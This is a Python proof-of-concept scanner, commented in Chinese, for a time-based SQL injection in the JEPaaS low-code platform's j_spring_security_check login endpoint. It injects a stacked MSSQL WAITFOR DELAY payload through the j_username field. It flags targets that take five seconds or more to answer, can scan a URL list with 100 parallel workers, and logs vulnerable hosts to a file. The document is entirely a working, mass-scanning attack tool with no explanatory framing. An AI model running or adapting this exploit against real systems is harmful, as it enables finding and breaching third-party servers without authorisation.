#JEPaaS 低代码平台 j_spring_security_check SQL注入漏洞
import requests,argparse,sys,time,requests_raw
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="JEPaaS 低代码平台 j_spring_security_check SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    data = "POST /j_spring_security_check HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: */*\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 71\r\n\r\nj_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--\r\n"
    try:
        res = requests_raw.raw(url=target,data=data,verify=False)
        print(res.status_code)
        print(res.text)
        if res.status_code == 302:
            if res.elapsed.total_seconds() >= 5:
                print(f'[+]该url{target}存在漏洞')
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()